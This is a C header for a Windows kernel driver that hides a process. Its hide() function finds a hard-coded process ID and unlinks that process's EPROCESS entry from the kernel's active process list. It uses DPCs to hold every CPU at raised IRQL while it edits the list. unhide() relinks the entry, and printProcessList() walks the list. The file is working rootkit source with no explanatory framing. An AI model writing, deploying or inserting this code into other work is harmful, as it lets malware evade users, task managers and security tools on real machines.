#pragma once
#include <pch.h>

#define ActiveProcessLinksOffset 0x448
#define ImageFileNameOffset 0x05A8
#define pidToHide 6008

PLIST_ENTRY targetProcessLink = NULL;
long volatile AllCPURaised, numberOfRaisedCPU;

PKDPC GainExclusivity();
NTSTATUS ReleaseExclusivity(PVOID);

VOID hide()
{
	PEPROCESS targetProcessToHide;
	void* targetHandle = ULongToHandle(pidToHide);
	if (!targetHandle) return;
	PsLookupProcessByProcessId(targetHandle, &targetProcessToHide);
	targetProcessLink = (PLIST_ENTRY)((PCHAR)targetProcessToHide + ActiveProcessLinksOffset);
	




	// raise the irql level of the current processor
	KIRQL currentIrql = KeGetCurrentIrql();
	KIRQL oldIrql = currentIrql;
	if (currentIrql < DISPATCH_LEVEL)
		KeRaiseIrql(DISPATCH_LEVEL, &oldIrql);

	PKDPC pkDPC = GainExclusivity();
		PLIST_ENTRY nextProcessLink = targetProcessLink->Flink;
		PLIST_ENTRY previousProcessLink = targetProcessLink->Blink;
		nextProcessLink->Blink = previousProcessLink;
		previousProcessLink->Flink = nextProcessLink;

		/*
		If the target process exits the kernel will correct the links of the next/previous processes
		but if the next/previous processes are already dead it will cause BSOD, so we need to make the target process
		point to itself in the Flink and Blink
		*/
		targetProcessLink->Flink = targetProcessLink;
		targetProcessLink->Blink = targetProcessLink;
	ReleaseExclusivity(pkDPC);

	KeLowerIrql(oldIrql);
}

void unhide()
{
	PEPROCESS currentProcess = IoGetCurrentProcess();

	// raise the irql level of the current processor
	KIRQL currentIrql = KeGetCurrentIrql();
	KIRQL oldIrql = currentIrql;
	if (currentIrql < DISPATCH_LEVEL)
		KeRaiseIrql(DISPATCH_LEVEL, &oldIrql);


	PKDPC pkDPC = GainExclusivity();
	PLIST_ENTRY currentProcessLink = (PLIST_ENTRY)((PCHAR)currentProcess + ActiveProcessLinksOffset);
	targetProcessLink->Flink = currentProcessLink;
	targetProcessLink->Blink = currentProcessLink->Blink;

	targetProcessLink->Blink->Flink = targetProcessLink;
	targetProcessLink->Flink->Blink = targetProcessLink;


	ReleaseExclusivity(pkDPC);
	KeLowerIrql(oldIrql);
}

void printProcessList()
{
	PEPROCESS firstEProcess;
	PEPROCESS currentEProcess = firstEProcess = IoGetCurrentProcess();
	do
	{
		PCHAR addressImageName = (PCHAR)currentEProcess + ImageFileNameOffset;
		DbgPrint("Image name:%s", addressImageName);
		currentEProcess = (PEPROCESS)((*(PLONGLONG)((PCHAR)currentEProcess + ActiveProcessLinksOffset)) - ActiveProcessLinksOffset);
	} while (currentEProcess != firstEProcess);
}

VOID RaiseCPUIrqlAndWait(PKDPC Dpc, PVOID DeferredContext, PVOID SysArg1, PVOID SysArg2)
{
	InterlockedIncrement(&numberOfRaisedCPU);
	while (!InterlockedCompareExchange(&AllCPURaised, 1, 1))
	{
		__nop();
	}
	InterlockedDecrement(&numberOfRaisedCPU);
}


PKDPC GainExclusivity()
{
	NTSTATUS us;
	ULONG currentProcessorNumber;
	CCHAR i;
	PKDPC pKDpc, tempDPC;

	// Check level
	if (KeGetCurrentIrql() != DISPATCH_LEVEL) return NULL;

	// Interlocked zero the globals
	InterlockedAnd(&AllCPURaised, 0);
	InterlockedAnd(&numberOfRaisedCPU, 0);

	// Setup nonpaged pool for DPC functions
	tempDPC = (PKDPC)ExAllocatePool(NonPagedPool, KeNumberProcessors * sizeof(KDPC));
	if (tempDPC == NULL) return NULL;

	currentProcessorNumber = KeGetCurrentProcessorNumber();
	pKDpc = tempDPC;

	for (i = 0; i < KeNumberProcessors; i++, tempDPC++)
	{
		// The DPC must not run on the current CPU it will cause a deadlock
		if (i == currentProcessorNumber) 
			continue;

		KeInitializeDpc(tempDPC, RaiseCPUIrqlAndWait, NULL);
		KeSetTargetProcessorDpc(tempDPC, i);
		KeInsertQueueDpc(tempDPC, NULL, NULL);
	}

	// Wait until all processors raised their irql level to DISPATCH_LEVEL
	while (InterlockedCompareExchange(&numberOfRaisedCPU, KeNumberProcessors - 1, KeNumberProcessors - 1) != KeNumberProcessors - 1)
	{
		__nop();
	}

	// Return
	return pKDpc;
}


NTSTATUS ReleaseExclusivity(PVOID pKDpc)
{
	// Signal all the processors they can exit the loop
	InterlockedIncrement(&AllCPURaised);

	// Wait for...
	while (InterlockedCompareExchange(&numberOfRaisedCPU, 0, 0))
	{
		__nop();
	}

	// Free mem
	if (pKDpc != NULL)
	{
		ExFreePool(pKDpc);
		pKDpc = NULL;
	}

	return STATUS_SUCCESS;
}

